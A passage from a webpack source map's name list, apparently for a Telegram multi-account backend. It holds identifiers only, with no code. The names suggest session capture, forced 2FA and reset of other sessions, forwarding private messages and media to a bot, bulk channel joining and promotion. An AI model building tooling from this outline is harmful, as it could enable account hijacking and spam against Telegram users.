ermissions","rank","demoteAdmin","cleanupChat","cleanup","beforeDate","onlyMedia","excludePinned","getChatStatistics","period","scheduleMessage","schedule","scheduledTime","replyTo","silent","getScheduledMessages","sendVoiceMessage","voice","sendViewOnceMedia","file","viewOnceDto","sourceType","MediaSourceType","BINARY","binaryData","originalname","base64Data","getChatHistory","offset","getMessagesNew","unblockGroupUser","getGroupAdmins","getGroupBannedUsers","exportContacts","exportDto","format","includeBlocked","toISOString","importContacts","contacts","manageBlockList","blockList","userIds","block","getContactStatistics","createChatFolder","getChatFolders","editMessage","updateChatSettings","sendMediaBatch","hasPassword","getChats","offsetDate","offsetPeer","folderId","getFileUrl","getMessageStats","getTopPrivateChats","addBotsToChannel","body","channelIds","createBot","createBotDto","ApiParam","description","required","ApiResponse","Param","UpdateProfileDto","ProfilePhotoDto","Delete","ApiQuery","Number","Query","example","SendMessageDto","ForwardBatchDto","BatchProcessDto","ApiOkResponse","SearchMessagesResponseDto","ApiBadRequestResponse","ApiNotFoundResponse","ApiUnauthorizedResponse","SearchMessagesDto","Boolean","UpdateUsernameDto","PrivacySettingsDto","ConnectionStatusDto","AddContactsDto","SendMediaDto","SendMediaAlbumDto","enum","MediaMetadataDto","DeleteHistoryDto","default","createGroupDto","GroupSettingsDto","GroupMemberOperationDto","AdminOperationDto","ChatCleanupDto","ScheduleMessageDto","ApiConsumes","properties","UseInterceptors","FileInterceptor","storage","multer","memoryStorage","UploadedFile","ViewOnceMediaDto","ContactExportImportDto","ContactBlockListDto","CreateChatFolderDto","Put","CreateBotDto","botToken","username","TelegramService","forwardRef","TelegramValidationConfig","provide","useValue","TelegramLogger","usersService","activeChannelsService","channelsService","cleanupInterval","startCleanupInterval","setUsersService","logOperation","clearInterval","getActiveClientSetup","setActiveClientSetup","getChatId","telegramClient","getchatId","tryJoiningChannel","chatEntity","joinChannel","phoneNumber","canSendMsgs","remove","channelId","removeChannels","channelDetails","searchError","private","addContact","getSelfMsgsInfo","getSelfMSgsInfo","createGroup","setTimeout","forwardMediaToBot","channels","filter","chat","isChannel","isGroup","cannotSendMsgs","defaultBannedRights","sendMessages","broadcast","participantsCount","shouldMatch","id","title","megagroup","restricted","forbidden","createMultiple","getmedia","getMediaMessages","sendIds","channelInfo","set2fa","errorDetails","HttpException","updatePrivacyforDeletedAccount","updateProfilePic","downloadProfilePic","index","getAllMediaMetaData","leaveChannels","leaveChannelIds","canSendFalseChats","query","dialogs","chatData","activeConnections","getActiveConnectionCount","rateLimited","totalOperations","forwardMessages","auths","count","processor","errors","processed","i","slice","logError","createGroupOrChannel","chats","scheduleMessageSend","album","setContentFilters","filters","contactCount","mediaCount","media","base64String","isVideo","ext","pop","size","mediaData","localPath","extname","fileBuffer","readFileSync","basename","accountsChannel","updatesChannel","notifChannel","httpFailuresChannel","botTokens","BOT_TOKENS","token","botInfo","getBotInfo","setupBotInChannel","changeInfo","postMessages","editMessages","deleteMessages","banUsers","inviteUsers","pinMessages","addAdmins","anonymous","manageCall","ok","botId","botUsername","UsersService","ActiveChannelsService","ChannelsService","TelegramManager","sessionString","session","StringSession","channelArray","contentFilters","activeClientSetup","groupName","groupDescription","invoke","Api","CreateChannel","forImport","accessHash","archiveChat","usersToAdd","addUsersResult","InviteToChannel","InputChannel","users","folders","EditPeerFolders","folderPeers","InputFolderPeer","InputPeerChannel","createOrJoinChannel","channelAccessHash","accesshash","forwardSecretMsgs","me","finalChats","Set","mediaMessages","MessageMediaType","VIDEO","ROUND_VIDEO","DOCUMENT","VOICE","ROUND_VOICE","photo","messages","video","e","bots","getAllBotUsernames","ChannelCategory","SAVED_MESSAGES","getBotUsername","bot","getInputEntity","sendContactsFile","warn","uniqueMessageIds","document","roundVideo","roundVoice","chunkSize","fromPeer","revoke","totalMessages","forwardedCount","total","cleanupClient","handlers","listEventHandlers","removeEventHandler","debug","connected","destroy","delete","errorHandler","createClient","handlerFn","TelegramClient","parseInt","API_ID","API_HASH","connectionRetries","setLogLevel","LogLevel","ERROR","phone","addEventHandler","event","NewMessage","handleEvents","Chat","Channel","participants","GetParticipants","ChannelParticipantsRecent","hash","ChannelParticipants","userInfo","ChannelParticipant","userDetails","tgId","lastName","entityLike","getLastMsgs","msgs","resp","text","selfChatId","photoCount","ownPhotoCount","ownVideoCount","otherPhotoCount","otherVideoCount","videoCount","movieCount","messageHistory","toLocaleLowerCase","contains","fwdFrom","canSendTrueCount","canSendFalseCount","totalCount","replace","chatsArrayLength","ids","namePrefix","AddContact","mobiles","inputContacts","InputPhoneContact","ImportContacts","startsWith","LeaveChannel","JoinChannel","account","GetAuthorizations","auth","authorizations","isAuthMine","appName","country","deviceModel","resetAuthorization","field","values","some","criterion","ResetAuthorization","getAllChats","className","thumbnailUrl","getMediaUrl","date","sender","senderId","is_self","out","fromId","MessageMediaPhoto","sizes","thumb","MessageMediaDocument","mimeType","thumbs","button","buttons","KeyboardButtonUrl","Search","InputPeerEmpty","q","InputMessagesFilterPhotos","minDate","maxDate","addOffset","callLogs","InputMessagesFilterPhoneCalls","action","MessageActionPhoneCall","filteredResults","outgoing","incoming","chatCallCounts","totalCalls","logAction","peerId","ent","filteredChatCallCounts","getCallLogsInternal","finalResult","isPrivate","SetPrivacy","InputPrivacyKeyPhoneCall","rules","InputPrivacyValueDisallowAll","InputPrivacyKeyProfilePhoto","InputPrivacyValueAllowAll","InputPrivacyKeyPhoneNumber","InputPrivacyKeyStatusTimestamp","InputPrivacyKeyAbout","UpdateProfile","photoIndex","photos","GetUserPhotos","selectedPhoto","Math","max","photoFileSize","photoBuffer","downloadFile","InputPhotoFileLocation","fileReference","thumbSize","dcId","outputPath","latest","dateActive","GetContacts","DeleteHistory","Block","floor","getTime","safeGetEntity","mediaType","getMediaType","flat","hasMore","lastOffsetId","MessageMediaEmpty","fileLocation","inputLocation","InputDocumentFileLocation","iterDownload","requestSize","write","downloadWithTimeout","promise","race","_","getMediaDetails","DocumentEmpty","videoAttr","attributes","find","attr","DocumentAttributeVideo","fileNameAttr","DocumentAttributeFilename","fileName","duration","width","w","height","h","downloadFileFromUrl","baseUsername","newUserName","increment","UpdateUsername","CheckUsername","InputPrivacyKeyForwards","actualFilename","inputFile","uploadFile","CustomFile","workers","SendMedia","InputMediaUploadedDocument","supportsStreaming","ttlSeconds","InputMediaUploadedPhoto","randomId","random","filePath","writer","createWriteStream","pipe","image","statSync","UploadProfilePhoto","GetPassword","imapService","twoFaDetails","email","hint","newPassword","checkMailInterval","setInterval","updateTwoFaSettings","isCheckPassword","emailCodeCallback","retry","codeInterval","onEmailCodeError","sendFile","DeletePhotos","newClient","start","phoneCode","waitForOtp","onError","save","trim","channelUpdate","updates","u","UpdateChannel","member","EditPhoto","InputChatUploadedPhoto","EditTitle","EditChatAbout","slowMode","ToggleSlowMode","seconds","opts","scheduleDate","uploadedFile","forceDocument","GetScheduledHistory","Message","mediaFiles","InputSingleMedia","entities","SendMultiMedia","multiMedia","parseMode","DocumentAttributeAudio","toDelete","pinned","m","deletedCount","privacyRules","everybody","InputPrivacyValueAllowContacts","nobody","privacyMap","lastSeen","profilePhotos","forwards","calls","groups","InputPrivacyKeyChatInvite","authorizationsResult","devicesResult","GetWebAuthorizations","sessions","platform","systemVersion","dateCreated","ip","region","webSessions","domain","browser","exceptCurrent","ResetAuthorizations","ResetWebAuthorizations","ResetWebAuthorization","periodInSeconds","day","week","month","uniqueSenders","messageTypes","other","topSenders","sort","a","b","mostActiveHours","hour","getHours","getMediaExtension","mime","filterHandler","NewMessageEvent","evaluateMessage","actions","executeFilterAction","keywords","messageText","keyword","mediaTypes","EditBanned","participant","bannedRights","ChatBannedRights","untilDate","getSearchFilter","InputMessagesFilterVideo","InputMessagesFilterDocument","InputMessagesFilterUrl","InputMessagesFilterRoundVideo","InputMessagesFilterPhotoVideo","InputMessagesFilterVoice","InputMessagesFilterRoundVoice","InputMessagesFilterGif","InputMessagesFilterMusic","InputMessagesFilterChatPhotos","InputMessagesFilterGeo","InputMessagesFilterContacts","missed","InputMessagesFilterEmpty","getEntityId","User","viewMessages","sendStickers","sendGifs","sendGames","sendInline","embedLinks","EditAdmin","adminRights","ChatAdminRights","ChannelParticipantsAdmins","ChannelParticipantsBanned","queryFilter","searchQuery","TEXT","filteredMessages","localResult","allMedia","concat","thumbBuffer","mediaDetails","entityId","dialog","dialogError","generateCSV","contact","blocked","generateVCard","contactsResult","blockedContacts","GetBlocked","csvData","peers","p","success","Unblock","onlineContacts","c","online","withPhone","mutual","lastWeekActive","wasOnline","weekAgo","setDate","getDate","DialogFilter","includePeers","includedChats","excludePeers","excludedChats","pinnedPeers","includeContacts","nonContacts","includeNonContacts","includeGroups","broadcasts","includeBroadcasts","includeBots","excludeMuted","excludeRead","excludeArchived","UpdateDialogFilter","GetDialogFilters","includedChatsCount","excludedChatsCount","inputMedia","getMimeType","getMediaAttributes","EditMessage","unreadCount","lastMessage","linkedChat","linkedChannel","SetDiscussionGroup","group","fromDate","setMonth","getMonth","stats","withMedia","withLinks","withForwards","byHour","fill","byType","match","privateChats","isUser","fake","chatStats","ceil","batchResults","processingStart","messageStats","CHAT_PHOTO","callStats","mediaStats","videos","userCalls","interactionScore","activityBreakdown","videoCalls","mediaSharing","textMessages","processingTime","round","topChats","totalTime","test","chars","uniqueSuffix","charAt","tokenMatch","aboutText","profilePhotoUrl","photoError","createVCardContent","vCardContent","tempPath","mkdirSync","recursive","fileContent","PHONE_PATTERN","USERNAME_PATTERN","MESSAGE_MAX_LENGTH","CAPTION_MAX_LENGTH","FILE_SIZE_LIMIT","BATCH_SIZE_LIMIT","ALLOWED_MEDIA_TYPES","ALLOWED_PRIVACY_LEVELS","MESSAGE_TYPES","DEFAULT_PAGINATION","maxLimit","BaseBatchItemDto","ApiProperty","IsString","BatchItemDto","IsOptional","IsNumber","IsEnum","IsArray","ArrayMinSize","ArrayMaxSize","each","Transform","ChatStatisticsDto","ContactGroupDto","String","IsBoolean","ContactImportDto","IsNotEmpty","MaxLength","ApiPropertyOptional","IsInt","AdminPermission","AdminPermissionsDto","BaseGroupOperationDto","ValidateNested","Type","IsObject","IsDateString","BaseMediaOperationDto","MediaSearchDto","MediaFilterDto","IsUrl","MediaAlbumItemDto","VoiceMessageDto","SearchScope","ALL","Min","minimum","maximum","Max","IsDate","MessageTypeResult","MetadataType","DialogsQueryDto","BulkMessageOperationDto","minLength","maxLength","minItems","maxItems","PrivacyLevelEnum","SecuritySettingsDto","GetScheduledMessagesDto","DeleteScheduledMessageDto","RescheduleMessageDto","BatchProcessItemDto","ValidateIf","o","PATH","BASE64","ConnectionManager","clients","cleanupInactiveConnections","maxIdleTime","lastUsed","updateLastUsed","logDebug","clientInfo","telegramManager","registerClient","ACCOUNT_LOGIN_FAILURES","updateByFilter","$or","expired","hasClient","number","has","clientMobiles","keys","clear","intervalMs","catch","stopCleanupInterval","logWarning","TgSignupController","TgSignupService","cleanupStaleSessions","SESSION_CLEANUP_INTERVAL","phones","activeClients","disconnectClient","getRandomCredentials","API_CREDENTIALS","createdAt","LOGIN_TIMEOUT","validatePhoneNumber","clearTimeout","timeoutId","sendCode","existingSession","apiId","apiHash","retryDelay","useWSS","sendResult","SendCode","CodeSettings","currentNumber","allowAppHash","SentCodeSuccess","phoneCodeHash","isCodeViaApp","SentCodeTypeApp","verifyCode","newSession","reconnectError","signInResult","SignIn","AuthorizationSignUpRequired","handleNewUserRegistration","userData","processLoginResult","handle2FALogin","requires2FA","passwordSrpResult","passwordCheck","computeCheck","CheckPassword","randomName","signUpResult","SignUp","twoFA","lastActive","personalChats","totalChats","recentUsers","gender","create","InternalServerErrorException","PHONE_PREFIX","SendCodeDto","Matches","VerifyCodeDto","TgSignupResponse","tgSignupService","sendCodeDto","HttpStatus","CREATED","verifyCodeDto","BAD_REQUEST","OK","statusCode","TOO_MANY_REQUESTS","INTERNAL_SERVER_ERROR","ApiExtraModels","ActiveChannelsController","createActiveChannelDto","createChannelDtos","findAll","updateActiveChannelDto","addReaction","addReactionDto","reactions","addReactions","getRandomReaction","removeReaction","CreateActiveChannelDto","UpdateActiveChannelDto","AddReactionDto","ActiveChannel","ActiveChannelSchema","activeChannelModel","promoteMsgsService","availableMsgs","bulkOps","updateOne","bulkWrite","ordered","removeFromAvailableMsgs","$pull","addToAvailableMsgs","$addToSet","findOneAndDelete","randomIndex","reaction","getActiveChannels","skip","notIds","$gt","$ne","aggregate","$match","$skip","$limit","$sort","$project","randomField","executeQuery","queryExec","resetWordRestrictions","updateMany","banned","resetAvailableMsgs","$expr","$lt","$size","$ifNull","updateBannedChannels","updateDefaultReactions","PromoteMsgsService","reactRestricted","wordRestriction","dMRestriction","PartialType","Prop","unique","mongoose","defaultMessages","defaultReactions","ArchivedClientController","archivedclientService","createClientDto","checkArchivedClients","fetchOne","CreateClientDto","SearchClientDto","UpdateClientDto","ArchivedClientService","ClientSchema","archivedclientModel","clientService","promoteRepl","product","gpayId","promoteMobile","qrId","_doc","deletedUser","$regex","RegExp","archivedClients","clientIds","ClientService","BufferClientController","joinChannelsforBufferClients","joinchannelForBufferClients","checkbufferClients","checkBufferClients","addNewUserstoBufferClients","badIds","goodIds","setAsBufferClient","createdOrupdate","createOrUpdate","CreateBufferClientDto","SearchBufferClientDto","UpdateBufferClientDto","BufferClientService","BufferClientSchema","bufferClientModel","promoteClientService","joinChannelMap","leaveChannelMap","isJoinChannelProcessing","isLeaveChannelProcessing","JOIN_CHANNEL_INTERVAL","LEAVE_CHANNEL_INTERVAL","LEAVE_CHANNEL_BATCH_SIZE","bufferClient","throwErr","returnDocument","createOrUpdateUserDto","existingUser","deleteOne","removeFromBufferMap","clearBufferMap","clearJoinChannelInterval","skipExisting","clearLeaveChannelInterval","existingkeys","$nin","joinChannelQueue","leaveChannelQueue","joinChannelIntervalId","processTimeout","shift","channelsInfo","removeFromLeaveMap","clearLeaveMap","leaveChannelIntervalId","channelsToProcess","splice","availableDate","ConflictException","flatMap","bufferclients","promoteclients","promoteclientIds","cli","sixMonthsAgo","documents","PromoteClientService","BufferClient","BuildController","buildService","BuildService","BuildSchema","buildModel","npointSerive","updateDocument","NpointService","Build","ChannelsController","createChannelDto","updateChannelDto","CreateChannelDto","SearchChannelDto","UpdateChannelDto","ChannelSchema","ChannelModel","getChannels","pattern","notPattern","$and","$not","$addFields","$rand","ClientController","updateClient","findAllMasked","NOT_FOUND","requestBody","addPromoteMobile","mobileNumber","removePromoteMobile","Client","settingupClient","clientModel","bufferClientService","archivedClientService","clientsMap","lastUpdateMap","refreshMap","checkNpoint","existingClient","areJsonsNotSame","clientData","mapToJson","maskedCls","maskedClient","updatedAt","lean","allClients","every","uptimeChecker","uptimebot","setupClient","setupClientQueryDto","toBoolean","AUTO_CLIENT_SETUP","existingClientMobile","$lte","newBufferClient","existingMobile","newMobile","updateClientSession","updatedUsername","setup","days","archiveOld","formalities","middleName","toUpperCase","existingClientUser","deployKey","bufferClientDto","updatedBufferClient","lastUpdate","dbcoll","updateClients","generateNewSession","attempt","v","ArrayNotEmpty","NpointController","npointService","fetchDocument","postDocument","fetchAllDocuments","updatedDocument","content","csrfToken","cookie","baseUrl","signInUrl","fetchCsrfToken","request","fetchCsrfTokenFromHtml","ensureCsrfToken","documentId","post","put","csrfTokenMatch","CreatePromoteClientDto","SearchPromoteClientDto","UpdatePromoteClientDto","PromoteClientController","joinChannelsforPromoteClients","joinchannelForPromoteClients","checkpromoteClients","checkPromoteClients","addNewUserstoPromoteClients","setAsPromoteClient","PromoteClientSchema","promoteClientModel","promoteClient","removeFromPromoteMap","clearPromoteMap","clientPromoteMobiles","bufferClients","bufferClientIds","PromoteClient","PromoteMsgsController","PromoteMsgSchema","PromoteMsg","promotemsgModel","CreatePromoteStatDto","UpdatePromoteStatDto","PromoteStatController","promoteStatService","createPromoteStatDto","findByClient","updatePromoteStatDto","deleteAll","PromoteStatService","PromoteStat","PromoteStatSchema","promoteStatModel","promoteStat","deleteMany","reinitPromoteStats","uniqueChannels","releaseDay","lastUpdatedTimeStamp","of","ResponseType","additionalProperties","CreateStatDto","StatController","statService","createStatDto","findByChatIdAndProfile","profile","updateStatDto","UpdateStatDto","StatService","StatSchema","Stat","statModel","stat","Stat2Controller","Stat2Service","Stat2","TimestampController","timestampService","getClientsWithTimeDifference","thresholdMinutes","threshold","updateTimestampDto","TimestampService","TimestampSchema","timestampModel","timestamp","getTimeDifferences","currentTime","differences","difference","urls","clientParams","repl","updatedTimestamp","Timestamp","TransactionStatus","CreateTransactionDto","PENDING","MinLength","parseFloat","UpdateTransactionDto","Transaction","min","TransactionSchema","amount","TransactionController","transactionService","createTransactionDto","transactionId","issue","refundMethod","updateTransactionDto","TransactionService","transactionModel","newTransaction","savedTransaction","transaction","findById","transactions","transactionIdQuery","isValidObjectId","countDocuments","sendNotification","remainingFilters","updatedTransaction","findByIdAndUpdate","runValidators","deletedTransaction","findByIdAndDelete","UpiIdController","UpiIdService","updateUpiIdsdto","UpiIdSchema","UpiId","UpiIdModel","upiIds","refreshUPIs","existingUpiIds","CreateUserDataDto","SearchDto","UpdateUserDataDto","UserData","UserDataSchema","UserDataController","userDataService","createUserDataDto","updateAll","updateUserDataDto","clearCount","UserDataService","userDataModel","callCounts","currentCount","resetPaidUsers","payAmount","limitTime","paidReply","CreateUserDto","SearchUserDto","UpdateUserDto","UserSchema","UsersController","createUserDto","updateUserDto","userModel","clientsService","newUserBackup","matchedCount","modifiedCount","app","NestFactory","DocumentBuilder","setTitle","setDescription","setVersion","build","use","req","next","header","enableCors","allowedHeaders","origin","SwaggerModule","createDocument","useGlobalPipes","transformOptions","enableImplicitConversion","reason","isShuttingDown","shutdown","signal","exit","init","listen","PORT","getUrl","bootstrap","originalUrl","endpoint","verbose","ms","str","arr","element","normalizedValue","inputString","matches","freeze","json1","json2","keysToIgnore","normalizeObject","obj","normalized","sortedKeys","normalized1","normalized2","regex","titleMatch","usernameMatch","categoryMap","initialized","initPromise","initialize","envKeys","botTokensStr","t","category","getCategoryFromDescription","botUsernames","fetchUsername","lastUsedIndex","desc","cat","assertInitialized","getChannelId","getBotAndChannel","DEFAULT_RETRY_CONFIG","maxRetries","baseDelay","maxDelay","jitterFactor","DEFAULT_NOTIFICATION_CONFIG","enabled","channelEnvVar","notifyInternal","formattedMessage","extractMessage","notificationText","channelUrl","ppplbot","notifUrl","RETRYABLE_NETWORK_ERRORS","RETRYABLE_STATUS_CODES","shouldRetry","parsedError","isAxiosError","calculateBackoff","base","pow","jitter","makeBypassRequest","bypassUrl","bypassURL","finalBypassUrl","bypassAxios","retryConfig","notificationConfig","urlInfo","parsedUrl","URL","pathname","parseUrl","lastError","controller","AbortController","currentTimeout","abort","abortError","parseErrorError","isTimeout","bypassResponse","bypassError","bypassParsedError","extractBypassError","delay","errorData","parsedLastError","extractLastError","finalError","currentTokenIndex","initializeBotTokens","getBotTokens","tokens","apiUrl","DEFAULT_ERROR_CONFIG","maxMessageLength","notificationTimeout","ignorePatterns","defaultStatus","defaultMessage","defaultError","safeStringify","depth","maxDepth","k","errorInfo","extracted","sendErr","fullConfig","prefixStr","ResponseCode","extractStatusCode","rawMessage","responseData","ErrorMessage","UserMessage","extractErrorMessage","extractErrorType","extractedMessage","fullMessage","raw","ignoreError","patterns","shouldIgnoreError","notificationMessage","notificationError","fatalError","createError","errorType","ErrorUtils","module","require","__webpack_module_cache__","__webpack_exports__","__webpack_require__","moduleId","cachedModule","__webpack_modules__","call"],"sourceRoot":""}